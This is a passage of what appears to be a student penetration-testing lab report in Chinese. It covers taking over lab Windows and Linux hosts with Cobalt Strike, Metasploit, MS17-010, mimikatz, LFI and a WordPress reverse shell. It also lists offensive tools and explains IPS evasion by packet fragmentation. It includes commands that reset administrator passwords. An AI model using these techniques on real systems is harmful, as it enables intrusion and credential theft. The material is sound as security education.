![c99da025-de2d-4488-ae69-a35ecca5aabd](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/043da0d1-8092-45da-ac98-f1a4597b53f1)


![b376ce05-7af2-4866-881b-169167493908](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/1ace9c19-e50d-4f43-99e3-ab7d5338614d)


需要密码，可以直接修改：

![c62a95fd-145a-436c-bea5-4d3b394e2e9e](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/23640e74-28a7-46b7-8853-162b75859c56)


```sh
net user administrator admin@123 \\更改密码

net user administrator /active:yes \\激活密码
```

![8d444ddb-0c0b-40df-8a0e-bc77d022f66e](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/da22c9a8-7e35-4733-a54b-be9a84b1f04d)


![10f38d74-121d-4d8b-b142-948beb9942a0](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/d942ef07-013d-4dab-8760-9abeb8a56fae)

win7服务器显示的状态：


![48ac6141-7695-45f0-baa2-540bf4df1961](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/95bed4eb-65f6-4674-8ba3-c205fef002a9)

在蚁剑中关机，重启时远程连接

```
shutdown -r -t 0
```

![7c243edd-4803-46aa-a24b-f7042e956412](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8222bbd1-a3c8-4b80-8969-f2867b63b6b8)


**成功控制DMZ区web服务器：**

![image-20230410145303071](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410145303071.png)

### **（2）内网办公区渗透（域内主机-win2003）：**

**本机ping不到域内主机**

![image-20230410151219468](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410151219468.png)

在kali中运行服务端  bash teamserver kali ip（192.168.111.129） 密码（123456）

```
bash teamserver 192.168.111.129 123456
```



![image-20230410152643709](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410160920113.png)

**运行CS客户端：**

```
bash cobaltstrike
```

![image-20230410160952335](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410160952335.png)

**生成监听器：**

![image-20230410161915345](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410161915345.png)

 木马连接到监听器上，监听器返回服务端，服务端的内容在此页面上。

**生成木马：**

![image-20230410153427732](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410153427732.png)

**使用蚁剑上传木马到win7：**

![image-20230410153802569](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410153802569.png)

运行木马文件

![image-20230410153925369](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410153925369.png)

成功上线

![image-20230410162053673](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162053673.png)

 **Session的sleep改为1，响应1秒**

![image-20230410162144101](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162144101.png)

打开命令行，查看各种信息：

![image-20230410162415380](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162415380.png)

查看arp表，发现内网目标主机ip（192.168.52.141）

![image-20230410162446050](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162446050.png)

可以ping通win2003

![image-20230410162558368](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162558368.png)

**使用msf6监听9999端口：**

![image-20230410162833642](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162833642.png)

在CS中添加一个msf监听器

![image-20230410162935033](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410162935033.png)

 Spawn 发送到msf

![image-20230410163042180](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410163042180.png)

meterpreter攻击成功，msf也渗透到了win7：

![image-20230410164312228](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410164312228.png)

**搭建socks隧道：**

![image-20230410164425857](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410164425857.png)

**生成隧道代码：**

![image-20230410164516276](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410164516276.png)

**查询永恒之蓝漏洞：**

![image-20230410164703097](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230410164703097.png)



、、

![img](https://img-blog.csdnimg.cn/694680857c954bef9e119dda6e403959.png)

## 内网渗透测试（林羽喆）

### 网络配置
设置内网网段及外网网段如图，其中VMnet4是内网网段，VMnet3是外网网段
![](https://s3.hedgedoc.org/demo/uploads/40382797-551f-4719-90c1-1993957718f1.png)
在内网设置一台内网主机，内网主机IP为`192.168.60.128`。操作系统为Windows XP。
![](https://s3.hedgedoc.org/demo/uploads/2b301111-c591-44c9-afcb-6d2c990c29dd.png)
域控主机IP为`192.168.60.129`,操作系统为Windows Server 2008。
![](https://s3.hedgedoc.org/demo/uploads/af750e3f-cd74-404a-85a6-3cbb4dfc2107.png)
我们配置的网络结构如图所示
![](https://s3.hedgedoc.org/demo/uploads/6c6c11e5-4dc2-49e7-9ba6-735029feda07.png)
这里我们模拟已经打下Web服务器（已经获取了Web服务器的shell），尝试渗透内网的过程。此处我们已经获取了Web服务器的root权限。
### 内网主机信息收集
收集Web服务器搭载的主机网卡信息
![](https://s3.hedgedoc.org/demo/uploads/4bad21bb-b7df-417f-beae-38db2cefcf8e.png)
收集该主机其他信息（如防火墙等信息）
![](https://s3.hedgedoc.org/demo/uploads/76b2e7a7-19ae-4dcf-a856-2c94c0e70751.png)
建立内网代理
内网代理有多种方法，比如建立socks隧道，路由转发等。主要作用是可以使得攻击机访问处于内网的主机，有时也能起到绕过防火墙的作用。
此处我们采取的方法是设置路由转发。
可以看到设置路由转发后攻击机可以访问处于不同网段的内网主机（这里使用nmap扫描服务器另一张网卡为例）
![](https://s3.hedgedoc.org/demo/uploads/be7389c0-a921-4085-bc06-44e435c3b444.png)
可以看到处于外网网段的攻击机可以使用nmap扫描到内网网段信息。
![](https://s3.hedgedoc.org/demo/uploads/b69d0f93-ea1c-4442-922e-2f70baf96f84.png)
### 内网信息收集
使用nmap扫描，扫描得到了内网主机
![](https://s3.hedgedoc.org/demo/uploads/ed732b3a-8e1d-435c-b9b0-b26a5b9b214d.png)

发现内网主机开放了445端口，猜测可能有ms17-010漏洞，使用msf相关模块扫描，发现可能存在ms17-010漏洞
![](https://s3.hedgedoc.org/demo/uploads/e4a538d2-5dc2-4d2d-b108-efc491df9f48.png)
### 内网主机渗透
使用msf相关模块尝试利用ms17-010，最终利用成功，拿到了内网主机的shell
![](https://s3.hedgedoc.org/demo/uploads/6a524abc-23e3-4583-835f-118bab945b94.png)
![](https://s3.hedgedoc.org/demo/uploads/4c60231d-7c75-4b44-8c94-d607fd185826.png)
### 内网信息收集
内网主机arp表
![](https://s3.hedgedoc.org/demo/uploads/99eff116-88fc-4478-ac29-9a1e8ffc794e.png)
查询域控名
![](https://s3.hedgedoc.org/demo/uploads/51a39b8d-e272-496b-ab0a-87d249268280.png)
查询域控信息
![](https://s3.hedgedoc.org/demo/uploads/717ae1dd-3ab7-4caa-8251-3174c64c2319.png)
Nmap扫描域控
![](https://s3.hedgedoc.org/demo/uploads/b0d3f8d2-a0e6-4286-820a-d9d373f875ce.png)
### 域控渗透
因为我们已经获取了域主机的管理员权限。可以利用mimikatz读取主机上的明文密码，并使得我们的木马在服务器上执行
![](https://s3.hedgedoc.org/demo/uploads/d9ecf400-5429-4cdd-9d5a-2d2e72ecea67.png)
![](https://s3.hedgedoc.org/demo/uploads/cf49fbf0-2e51-4c49-9b30-20ea62cf4a02.png)
![](https://s3.hedgedoc.org/demo/uploads/13dd4287-5e7b-4b50-bb62-e49b9d5f94e3.png)







## 面向网络系统的攻击（林于翔）

### 主机发现和端口扫描

![](https://s3.hedgedoc.org/demo/uploads/41aeead0-77c9-4276-998d-8a4f69de11c5.png)

```
nmap -sP ip
```
![](https://s3.hedgedoc.org/demo/uploads/18470eee-6d4f-4c9d-80bd-8f813dbf8bfc.png)


```
arp-scan -l
```
![](https://s3.hedgedoc.org/demo/uploads/cb01fb7c-08c1-43a0-b220-d3501bc6dcbf.png)

![](https://s3.hedgedoc.org/demo/uploads/73eef4d8-9f9c-4b41-95d8-43027a23091e.png)

```
nmap -p 1-65535 -A ip
```
扫描得到开放的端口有22和80

### 目录扫描

先从80端口入手
访问网站的80端口，查看页面源代码，没有重要信息

![](https://s3.hedgedoc.org/demo/uploads/29a38174-c0fd-4213-85e9-f3e153f6454f.png)

```扫描目录的方法：
御剑
dirb
DirBuster
Dirsearch
AWVS漏洞扫描
Webdirscan
Cansina
wwwscan
dirmapGUI版本
WebPathBrute
web目录字典
```

上述扫描中扫出很多目录，可以知道这个网站框架是wordpress
![](https://s3.hedgedoc.org/demo/uploads/d4741685-9052-47f2-a8d3-ed8cb7102c61.png)
“我现在在最低层 而他在web最高处,我们可以发现dirb普通扫描并没有给我们带来很多有价值的东西”

深入扫描txt，php，zip文件

![](https://s3.hedgedoc.org/demo/uploads/d9fcafa1-9bc2-4b85-98e5-db6a64a7c322.png)

![](https://s3.hedgedoc.org/demo/uploads/ce0e3eb1-921d-4d77-afa4-7247dcd775be.png)
发现了image.php  index.php   secret,txt三个文件

访问文本文件
![](https://s3.hedgedoc.org/demo/uploads/4f2f5369-670f-4b86-9b51-3c9137419310.png)

可能两个php文件后有参数

推荐的fuzz工具

需要找到location.txt文件

fuzz是模糊测试的一种手段

```fuzz可以用来

  找参数

  目录扫描

  密码暴力破解

  找出被过滤的参数

    比如SQL或者XSS攻击时，寻找没有被过滤的关键词进行注入

  压力测试，看看网站能不能扛得住
  ```
用kali自带的wfuzz对index.php进行fuzz测试找参数
![](https://s3.hedgedoc.org/demo/uploads/1c9cfd97-c258-477f-9f48-d7e9d037d05f.png)

### FUZZ和LFI

过滤单词数
![](https://s3.hedgedoc.org/demo/uploads/5337f439-1700-471b-a1aa-cdc7f2edbceb.png)

地址后+?file=

这个接口是来访问文件的
LFI本地文件包含漏洞
![](https://s3.hedgedoc.org/demo/uploads/9496b2d8-ae0c-41b2-8a7b-4c89fcfa28ed.png)

在浏览器输入http://192.168.213.163/index.php?file=location.txt有回显
![](https://s3.hedgedoc.org/demo/uploads/df347310-db65-40c8-bb8b-b18b4d915669.png)

用secrettier360在别的php文件使用
直接访问image.php文件

![](https://s3.hedgedoc.org/demo/uploads/16e22bbf-7548-4b27-9a54-71cd7829841b.png)

参数对了还需要文件名
ubuntu常见的敏感文件/etc/passwd

![](https://s3.hedgedoc.org/demo/uploads/ec403443-2a63-47c6-afc8-b03020049b86.png)

用kali的curl工具查看

![](https://s3.hedgedoc.org/demo/uploads/dd773da8-eca0-4830-a2c8-c1622831bb6a.png)

找到了saket用户下一个可疑文件password.txt

![](https://s3.hedgedoc.org/demo/uploads/8eb52081-6c1c-4a53-8255-18d093aab702.png)
follow_the_ippsec不知道是哪里的密码

测试后不是ssh密码，也不是直接的登录密码

之前扫出过wordpress，是一个有用户系统的CMS系统

### WordPress漏洞扫描
主页
![](https://s3.hedgedoc.org/demo/uploads/f6b92386-133c-4e64-ae14-f3ce780c199b.png)

这里有管理员发的第一篇文章
![](https://s3.hedgedoc.org/demo/uploads/01d061ad-5953-411a-b98d-31bca6c90a66.png)

试试把author换一下，没有效果

用cmseek工具，做CMS指纹识别
没找到我们想要的结果

再用一个工具wpscan做CMS指纹识别
只有victor一个用户
结合前面获得的密码登录了后台

![](https://s3.hedgedoc.org/demo/uploads/3f56a7df-fe78-4557-9883-f0423a7f992c.png)

![](https://s3.hedgedoc.org/demo/uploads/bb4fd873-7a36-46c2-936a-5a7c2f023e9a.png)

![](https://s3.hedgedoc.org/demo/uploads/65fd0a7c-4f9e-471e-8cd7-468febb1ceef.png)

到了后台，想到一句话木马
wordpress里面有一个主题编辑器

![](https://s3.hedgedoc.org/demo/uploads/af354997-3add-4704-981b-6c051454aefd.png)

![](https://s3.hedgedoc.org/demo/uploads/7e2e1010-8f6c-4f3d-85f4-d4255a41dee3.png)

找到一个可以编辑的php文件
![](https://s3.hedgedoc.org/demo/uploads/dcad6b43-1237-48fe-b11a-e1c670ddcef9.png)

写入一句话木马或者访问这个文件建立反弹连接

这里选择建立反弹连接

用msf，既可以生成shell，也可以建立反弹连接
![](https://s3.hedgedoc.org/demo/uploads/4c8470f0-9e86-46f6-a12c-4e8ee90cd700.png)
毒液模块生成shell.php

将代码复制到输入框中

msf建立监听

![](https://s3.hedgedoc.org/demo/uploads/e1f381eb-b2e0-4cd2-b870-6f8b46e23dbb.png)

这个文件路径在./wordpress/wp-content/themes/twentynineteen/secret.php

访问该地址，就能成功建立msf连接

![](https://s3.hedgedoc.org/demo/uploads/4b134b3f-3898-4fe4-9a71-930518b168c9.png)

### Linux内核漏洞提权

```
准备提权到root的方式

  shell命令进入shell
  pty进入交互式会话
  继续做信息收集——敏感文件
  history
  查找高权限程序 sudo -l当前用户可以用root身份执行什么样的程序
  直接搜索操作系统的漏洞——msf真的很强大

```
![](https://s3.hedgedoc.org/demo/uploads/27690b82-f4de-467a-b578-cbed53fe5438.png)
结合内核版本4.10
![](https://s3.hedgedoc.org/demo/uploads/4a9c4dfc-3a53-4889-acb6-0b172f6ae00a.png)

本地权限提升，searchsploit提供了一个c程序，只需编译成可执行文件，传到目标靶机，执行这个程序，就可以提升权限了

cd /usr/share/exploitdb/exploits/linux/local
![](https://s3.hedgedoc.org/demo/uploads/6869a251-d1ed-4089-ab3b-d5006cff64ff.png)

meterpreter提供了一个upload命令把攻击机命令传到靶机上

/tmp目录下任何用户都有读写执行权限

![](https://s3.hedgedoc.org/demo/uploads/25c43de7-93da-43be-81e9-4800461d347b.png)

![](https://s3.hedgedoc.org/demo/uploads/eb0b6470-9e7c-420c-9f00-87452d10970d.png)

需要提升执行权限，此时要进入shell

![](https://s3.hedgedoc.org/demo/uploads/55a21571-c071-43b2-84e4-45a46fbbb747.png)

![](https://s3.hedgedoc.org/demo/uploads/e6785750-dd7b-47f8-846c-196fc34d0db2.png)



# 二、新型渗透攻击技术


## 1、体系化的漏洞挖掘工具集构建（开源项目收集）（林羽喆）

### 1.子域名枚举工具
```
子域名枚举和信息收集工具 Anubis
项目地址：https://github.com/jonluca/Anubis

使用名为 Hacking with search engine 的技术列出有关主域的子域 N4xD0rk
项目地址：https://github.com/n4xh4ck5/N4xD0rk

子域名爆破枚举工具 subDomainsBrute
项目地址：https://github.com/lijiejie/subDomainsBrute

子域名爆破枚举工具 wydomain
项目地址：https://github.com/ring04h/wydomain

子域枚举工具 subbrute
项目地址：https://github.com/TheRook/subbrute

基于谷歌SSL透明证书的子域名查询工具-GSDF
项目地址：https://github.com/We5ter/GSDF

旨在使用OSINT的工具 Sublist3r
https://github.com/aboul3la/Sublist3r
```

Anubis、subDomainsBrute、Sublist3r 都是子域名枚举工具，但是它们各有优缺点。Anubis 可以从多个来源收集数据，包括 HackerTarget、DNSDumpster、x509 证书、VirusTotal、Google、Pkey、Sublist3r、Shodan、Spyse 和 NetCraft。SubDomainsBrute 是一个基于 Python 的子域名枚举工具，它可以使用字典和暴力破解的方式来查找子域名。Sublist3r 是一个 Python 工具，它可以从多个来源获取子域名信息，包括 Google、Yahoo、Bing、Baidu 等。

如果需要快速地获取子域名信息，可以使用 SubDomainsBrute。如果需要更全面的信息，可以使用 Sublist3r。如果需要更多的数据来源，可以使用 Anubis。
### 2.端口扫描
```
nmap
https://github.com/nmap/nmap

masscan
https://github.com/robertdavidgraham/masscan​

Naabu
https://github.com/projectdiscovery/naabu

Rustscan
https://github.com/RustScan/RustScan

Zmap
https://github.com/zmap/zmap

AngryIP Scanner
https://angryip.org/

Scantron 集成 nmap 和 masscan 的分布式扫描器，利用 SSH 隧道来实现分布式控制扫描节点
https://github.com/opsdisk/scantron

Scanless，一个命令行工具，调用第三方端口扫描服务的 API 来实现间接端口扫描
https://github.com/vesche/scanless

Unimap 这个工具可以先通过解析获取 IP，去重之后再发送给 Nmap 进行扫描，从而提高扫描的速度。
https://github.com/Edu4rdSHL/unimap

Advanced Port Scanner，windows 下的一款 GUI 版端口扫描器。
https://www.advanced-port-scanner.com/
```
这些工具各有优缺点，适用于不同的场景。如果需要快速地进行端口扫描，可以使用 Zmap 或 Masscan。如果需要更全面的信息，您可以使用 Nmap。不过在实际适用过程中，快速扫描工具（如zmap）可能会因为发送数据包过快导致被流量检测设备捕获，所以目前最常被使用的端口扫描工具还是nmap。其他很多工具都是基于nmap进行改进，或者直接集成nmap来实现的。
### 3.资产收集
```
Google(百度) 语法

安全搜索引擎，如
fofa  https://fofa.info/
zoomeye https://www.zoomeye.org/discover

goby
https://gobies.org/
```
Google Hacking 是一种利用 Google 搜索引擎进行信息收集的技术，可以搜索到一些网站的敏感信息。例如，可以使用 Google 搜索引擎搜索 “site:example.com password” 来搜索 example.com 网站的密码信息。Google Hacking 的优点是它可以搜索到一些网站的敏感信息，而且使用方便。

ZoomEye 和 FOFA 都是网络空间搜索引擎，可以搜索到更多的信息，包括设备信息、漏洞信息等。ZoomEye 和 FOFA 的优点是它们可以搜索到更多的信息，包括设备信息、漏洞信息等。
### 4.fuzz工具
```
LibFuzzer - fuzz
项目地址：https://llvm.org/docs/LibFuzzer.html

用于模糊 Windows 二进制文件的 AFL 分支，在目标二进制文件中找到新的执行路径 winafl
项目地址：https://github.com/ivanfratric/winafl

NodeFuzz 用于 Web 浏览器和类似浏览器的应用程序的模糊器工具 NodeFuzz
项目地址：https://github.com/attekett/NodeFuzz

开源软件的连续模糊测试 OSS-Fuzz
项目地址：https://github.com/google/oss-fuzz

阿尔法实验室fuzz工具 alphafuzzer
项目地址：http://blog.topsec.com.cn/alphafuzzer/
```
### 5.自动化渗透测试工具
```
自动化渗透测试工具 AttackSurfaceMapper
项目地址：https://github.com/superhedgy/AttackSurfaceMapper
使用手册：https://www.uedbox.com/post/59110/

自动化渗透测试 vajra
项目地址：https://github.com/r3curs1v3-pr0xy/vajra

渗透测试报告自动生成工具
项目地址：https://github.com/Mustard404/Savior
```
### 6.漏洞利用框架
```
黑客工具包 hackUtils
项目地址：https://github.com/brianwrf/hackUtils

支持PowerShell的渗透测试框架 nishang
项目地址：https://github.com/samratashok/nishang

msf框架
项目地址：https://github.com/rapid7/metasploit-framework

pocsscan攻击框架
项目地址：https://github.com/erevus-cn/pocscan

Pocsuite攻击框架
项目地址：https://github.com/knownsec/Pocsuite

Beebeeto攻击框架
项目地址：https://github.com/n0tr00t/Beebeeto-framework

ExploitDB官方git版本
项目地址：https://github.com/offensive-security/exploitdb

php漏洞代码分析
项目地址：https://github.com/80vul/phpcodz

JAVA反序列化POC生成工具
项目地址：https://github.com/frohoff/ysoserial

JAVA反序列化EXP
项目地址：https://github.com/foxglovesec/JavaUnserializeExploits

php7缓存覆写漏洞Demo及相关工具
项目地址：https://github.com/GoSecure/php7-opcache-override

XcodeGhost木马样本
项目地址：https://github.com/XcodeGhostSource/XcodeGhost
```
### 7.CVE漏洞利用
```
对已知漏洞执行本地搜索工具 cve-search 
项目地址：https://github.com/cve-search/cve-search

CVE
https://cve.mitre.org/

CNVD
https://www.cnvd.org.cn/
```
### 8.靶场
```
供测试排查的勒索软件 CryptSky
项目地址：https://github.com/deadPix3l/CryptSky

cker运行，漏洞练习平台 WebGoat
项目地址：https://github.com/WebGoat/WebGoat

常见的服务器端应用程序缺陷，漏洞练习平台 webgoat-legacy
项目地址：https://github.com/WebGoat/WebGoat-Legacy

web漏洞练习平台 zvuldirll
项目地址：https://github.com/710leo/ZVulDrill

各种组件漏洞环境，思科、openssl等漏洞练习平台 vulapps
项目地址：https://github.com/Medicean/VulApps

Web应用程序漏洞练习平台 dvwa
https://github.com/digininja/DVWA

sql注入练习平台 sqli-labs
项目地址：https://github.com/Audi-1/sqli-labs

编写的漏洞练习平台 vulnerable
项目地址：https://github.com/cr0hn/vulnerable-node

Ruby编写的一款工具，生成含漏洞的虚拟机
项目地址：https://github.com/cliffe/secgen

漏洞学习平台 vulstudy
项目地址：https://github.com/c0ny1/vulstudy

漏洞复现平台 vulhub
https://github.com/vulhub/vulhub

模拟实际攻击的平台 vulnhub
https://www.vulnhub.com/
```
### 9.漏洞扫描工具
```
可定制的漏洞扫描器 nuclei
项目地址：https://github.com/projectdiscovery/nuclei

网络服务器扫描仪 nikto
项目地址：https://github.com/sullo/nikto

Web 应用程序扫描 w3af
项目地址：https://github.com/andresriancho/w3af

漏洞扫描程序 vuls
项目地址：https://github.com/future-architect/vuls

漏洞扫描器 HellRaiser
项目地址：https://github.com/m0nad/HellRaiser

Waf类型检测识别工具
项目地址：https://github.com/EnableSecurity/wafw00f

功能强大的安全评估工具 xray
https://github.com/chaitin/xray/releases
```
### 10.远控工具
```
用gmail充当C&C服务器的后门 gcat
项目地址：https://github.com/byt3bl33d3r/gcat

C#RAT（远程管理工具）BlackHole
项目地址：https://github.com/hussein-aitlahcen/BlackHole

webshell 开源项目 webshell
项目地址：https://github.com/tennc/webshell

XSS渗透管理平台 xssplatform
项目地址：https://github.com/78778443/xssplatform

XSS与CSRF工具 xssor
项目地址：https://github.com/evilcos/xssor

渗透工具包 pentestpackage
项目地址：https://github.com/leonteale/pentestpackage

网站扫描工具 dirsearch
项目地址：https://github.com/maurosoria/dirsearch

命令注入利用工具 commix
项目地址：https://github.com/commixproject/commix

服务器端模板注入和代码注入检测和利用工具,支持burp插件 tplmap
项目地址：https://github.com/epinna/tplmap

渗透测试工具包 ToolSuite
项目地址：https://github.com/codejanus/ToolSuite

Apache 实时日志分析系统 ARTLAS
项目地址：https://github.com/mthbernardes/ARTLAS

web指纹识别 whatweb
项目地址：https://github.com/urbanadventurer/whatweb

web爬行框架 Malspider
项目地址：https://github.com/ciscocsirt/malspider

WordPress 安全扫描器 wpscan
项目地址：https://github.com/wpscanteam/wpscan

webshell管理工具 Cknife
项目地址：https://github.com/Chora10/Cknife

github泄露利用工具 GitHack
项目地址：https://github.com/lijiejie/GitHack

XSS利用神器 BeEF
项目地址：https://github.com/beefproject/beef

自动化绕过WAF脚本 WAFNinja
项目地址：https://github.com/khalilbijjou/WAFNinja

WAF Bypass模块 wafbypasser
项目地址：https://github.com/owtf/wafbypasser

http命令行客户端 httpie
项目地址：https://github.com/httpie/httpie

DISCUZ漏洞扫描器 dzscan
项目地址：https://github.com/code-scan/dzscan

Tomcat渗透测试工具 tomcatWarDeployer
项目地址：https://github.com/mgeeky/tomcatWarDeployer

burpsuit插件识别J2EE指纹和CVE漏洞检测 J2EEScan
项目地址：https://github.com/ilmila/J2EEScan
```
### 11.SQL注入
```
sqlmap
项目地址：https://github.com/sqlmapproject/sqlmap

SQLiScanner 基于SQLMAP和Charles的被动SQL注入漏洞扫描工具 SQLiScanner
项目地址：https://github.com/0xbug/SQLiScanner

sql注入漏洞扫描器 DSSS
项目地址：https://github.com/stamparm/DSSS

基于python编写的开源的攻击工具 NoSQLAttack
项目地址：https://github.com/youngyangyang04/NoSQLAttack

内部渗透测试的PowerShell 工具包 PowerUpSQL
项目地址：https://github.com/NetSPI/PowerUpSQL

Java编写的SQL注入工具 jsql-injection
项目地址：https://github.com/ron190/jsql-injection
```
### 12.代理工具
```
内网穿透代理服务器 nps
项目地址：https://github.com/ehang-io/nps

HTTP隧道，socket代理
项目地址：https://github.com/sensepost/reGeorg

EarthWorm代理工具
项目地址：https://github.com/idlefire/ew
```
### 13.弱口令爆破
```
弱密码扫描器 x-crack
项目地址：https://github.com/netxfly/x-crack

弱口令字典
项目地址：https://github.com/fuzz-security/SuperWordlist

弱口令探测字典脚本 cupp
项目地址：https://github.com/Mebus/cupp
```

### 16.二进制安全
```
angr
https://github.com/angr/angr

其他诸如pwntools等，应该都挺常见的
```
### 17.逆向
```
52破解上基本都有，所以就放了各52破解的链接
https://down.52pojie.cn/Tools/
```
### 18.嵌入式设备渗透
``` 
routersploit 嵌入式设备渗透框架
https://github.com/threat9/routersploit

​PENIOT​ 物联网渗透测试工具
https://github.com/yakuza8/peniot

​​Objective 对物联网环境中使用的安卓和 iOS 应用程序进行详细分析和安全审计的工具
https://github.com/sensepost/objection​​

​​Binwalk 逆向硬件设计的工具
https://www.kali.org/tools/binwalk​

​​Firmwalker 用于搜索和扫描固件文件系统
https://github.com/craigz28/firmwalker

hackebds 在嵌入式设备渗透过程中生成反向shell代码
https://github.com/doudoudedi/hackEmbedded​

EmbedOS 集成了诸多固件安全设施测试工具
https://github.com/scriptingxss/EmbedOS
```
### 19.容器渗透
```
dockscan docker扫描工具
https://github.com/kost/dockscan

docker未授权访问漏洞利用脚本
https://github.com/ianxtianxt/docker_api_vul

clair 容器漏洞静态分析
https://github.com/quay/clair

CDK 为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP
https://github.com/cdk-team/CDK/releases/

Gorsair 功能强大的针对Docker容器的渗透测试工具
https://github.com/Ullaakut/Gorsair
```
### 20.实际攻击测试
见第一部分


## 2、安全防护场景的探测（在VPN、WAF、FW、HTTPS场景下，探测网络中的公开和非公开服务、拓扑）（梁亚萌）

### 检测WAF

**WAFW00F**是一个Web应用防火墙（WAF）指纹识别的工具。

nmap默认有19个指纹，sqlmap默认有94个指纹，wafw00f默认有155个指纹

WAFW00F工作原理：

1）首先通过发送一个正常http请求，然后观察其返回有没有一些特征字符

2）如果不成功，它将发送大量(潜在的恶意) HTTP 请求，并使用简单的逻辑推断出它是哪个WAF

3）如果这也不成功，它将分析以前返回的响应，并使用另一个简单的算法来猜测 WAF 或安全解决方案是否正在积极响应我们的攻击

![](https://s3.hedgedoc.org/demo/uploads/c674b424-620b-48db-9221-953aae6d2d39.png)


![](https://s3.hedgedoc.org/demo/uploads/61194c72-69b5-47be-bbd6-1556a920c5fd.png)


![](https://s3.hedgedoc.org/demo/uploads/4167f823-bd4d-4f7b-8213-54453c9dcfcc.png)


### 检测网络服务、绘制网络拓扑

**zenmap**是一个开放源代码的网络探测和安全审核的工具，它是nmap安全扫描工具的图形界面前端，它可以支持跨平台。使用zenmap工具可以快速地扫描大型网络或单个主机的信息。如扫描主机提供了哪些服务，使用的操作系统等。

开放服务：

![](https://s3.hedgedoc.org/demo/uploads/6eadda68-57d8-4696-b190-4de70f049114.png)

拓扑图：

![](https://s3.hedgedoc.org/demo/uploads/e23d7322-5ae4-4bc1-bc1e-303d9cf50ea8.png)



## 3、绕过WAF、IPS的攻击（绕过规则检测、设备脆弱性利）（林于翔）

### IDS/IPS防护原理及绕过思路
IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击；IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层；WAF是在应用层防护Web攻击的程序，一般是跟Web接入层对接，可旁路可串行，仅能覆盖应用层。假设把网络层的旁路防护设备视为IPS。

接下来就到网络层。

IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。常见的场景是封禁网站（如非法网站的封禁）、篡改网页内容（运营商插广告）、阻断端口扫描和漏洞攻击（IPS），实施链路劫持的人必须控制某段网络。

攻击者嗅探到符合特征的流量后即伪造响应，这里是伪造了HTTP响应（为了篡改页面），如果只是阻断的话就是伪造rst包干扰TCP握手过程或者连接。

![](https://s3.hedgedoc.org/demo/uploads/e194614f-78e8-4dab-a4a5-9216503f8de1.jpg)

IPS是旁路部署，所以只能通过发伪造包的方式来达到干扰双方正常通信的目的，正常的包其实还是会到达客户端和服务端，只不过相同序号的包操作系统已经处理过了，这些包会被认为是错误的包从而丢掉。

所以，从原理分析，绕过IPS可以从两个方向着手：1）检测上，如果IPS在流量里检测不到攻击特征，则不会有后续动作；2）阻断上，正常包也会到达服务器，只是来晚了，如果有办法让伪造的包失效，则阻断不会发生。

#### IPS绕过实例

常见的IPS阻断场景有四种：

1）可以建立TCP连接，检查客户端发出的HTTP请求中的特征，如匹配则发rst阻断或HTTP响应替换，用于域名封禁或Web攻击防护；
2）不让建立TCP连接，即客户端发syn包时IPS直接回rst，同时后续如有ack包会双向回rst阻断，用于访问控制或端口封禁；
3）DNS查询场景，伪造DNS响应，劫持网站域名用于封禁或者钓鱼攻击；
4）UDP传输场景下，伪造ICMP响应，告知客户端UDP端口不可达。

对于1，可以从两方面入手：在应用层，一般利用IPS和Web Server对HTTP语法的理解差异；在网络层，一般利用IPS和操作系统协议栈对TCP/IP的处理方式差异，后续会讨论；对于3，换个DNS Server就行了，业界对DNS劫持也有很好的方案；4是阻断UDP访问，分析见后文。

#### TCP分片

一些IPS是字节级逐包检查的，并没有实现TCP分片重组能力，那就把关键字拆到两个TCP包里面就可以。以下是Perl实现的TCP分片HTTP请求，关键字是“www.bad.com”，会拆分到两个TCP包发出。
![](https://s3.hedgedoc.org/demo/uploads/17d2ef01-08ea-470e-8771-ea170425e2c3.jpg)

TCP分片绕过，返回了200（如果不实施TCP分片，会返回302）

如果IPS实现了TCP分片重组怎么办？有的IPS虽然有TCP分片重组能力，但是不会无限等待，超过某个时间就不会再检查了，所以设置这个sleep的时间超过IPS的分片重组超时值而又没有达到操作系统和Web Server的超时值，那就可以绕过。

#### IP分片

IP包也是支持分片的，原理类似，只是要构造IP包就需要用到Python下的组件Scapy，TCP三次握手后用Scapy的fragment函数按600字节一个拆分发送IP分片包（当然也可以把syn包也分片），代码如下：

```
import time
from scapy.all import *
import sys

r_ip='192.168.213.151'
r_port=80
